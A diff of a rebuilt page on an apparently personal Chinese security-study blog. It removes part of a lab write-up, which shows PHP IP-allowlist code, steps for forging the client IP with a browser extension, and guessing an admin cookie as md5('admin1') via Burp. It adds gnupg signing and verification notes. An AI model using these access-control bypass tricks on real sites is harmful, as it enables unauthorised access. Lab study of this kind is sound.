-<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#获取浏览当前页面的用户的 IP 地址</span>
-	<span class="token variable">$cip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">else</span>
-	<span class="token variable">$cip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0.0.0.0"</span><span class="token punctuation">;</span>
-<span class="token keyword">return</span> <span class="token variable">$cip</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
+<span class="token comment">#  local-user 参数指定用发信者的私钥签名，recipient 参数指定用接收者的公钥加密，armor 参数表示采用 ASCII 码形式显示，sign 参数表示需要签名，encrypt 参数表示指定源文件。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<span class="token variable">$GetIPs</span> <span class="token operator">=</span> <span class="token function">GetIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$GetIPs</span><span class="token operator">==</span><span class="token string double-quoted-string">"1.1.1.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"*********"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"警告！你的IP不在列表之内！"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol start="16">
+<li>验证签名</li>
+</ol>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --verify demo.txt.asc demo.txt
+<span class="token comment"># 我们收到别人签名后的文件，需要用对方的公钥验证签名是否为真。verify 参数用来验证。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><a target="_blank" rel="noopener" href="https://www.w3schools.cn/php/php_superglobals_server.asp">部分php $_SERVER()用法</a></p>
-<ol start="2">
-<li>使用 ModHeader 扩展插件伪造IP</li>
-</ol>
-<p><img src="/2023/032944469/49.png" alt=" "></p>
-<ol start="3">
-<li>重新访问目标网页</li>
-</ol>
-<p><img src="/2023/032944469/50.PNG" alt=" "></p>
-<p>success!!!</p>
-<h3 id="cookie暴力猜解"><a href="#cookie暴力猜解" class="headerlink" title="cookie暴力猜解"></a>cookie暴力猜解</h3><ol>
-<li>使用测试账号登录，之后发现在登录成功之后会进行跳转到admin.php界面(跳转失败，权限不足)，使用burp登录抓包。<strong>第一次抓到的是正常用户登录，之后点击forward，抓到登录admin.php的包</strong></li>
-</ol>
-<p><img src="/2023/032944469/56.PNG" alt=" "></p>
-<ol start="2">
-<li>这样抓包方式太麻烦，我们可以在修改时这样抓包，在猜想环节可以在Repeater中进行</li>
-</ol>
-<p><img src="/2023/032944469/57.PNG" alt=" "></p>
-<ol start="3">
-<li>普通用户cookie是<strong>token=md5(test2)</strong>,我们猜测管理员的cookie是<strong>token=md5(admin1)</strong>;admin可以测试知道不是，继续向下测试发现admin1可以</li>
-</ol>
-<p><img src="/2023/032944469/58.PNG" alt=" "></p>
+
+
 
                 
             </div>
@@ -844,7 +658,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wwqstudy.github.io/2023/032944469.html">http://wwqstudy.github.io/2023/032944469.html</a>
+                    <a href="http://wwqstudy.github.io/2023/042611340.html">http://wwqstudy.github.io/2023/042611340.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -929,13 +743,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/042611340.html">
+                <a href="/2023/042715691.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="gnupg使用">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Linux">
                         
-                        <span class="card-title">gnupg使用</span>
+                        <span class="card-title">Linux</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -946,7 +760,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-26
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-27
                         </span>
                         <span class="publish-author">
                             
@@ -966,13 +780,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/032935812.html">
+                <a href="/2023/032944469.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="re">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="漏洞分析与复现">
                         
-                        <span class="card-title">re</span>
+                        <span class="card-title">漏洞分析与复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
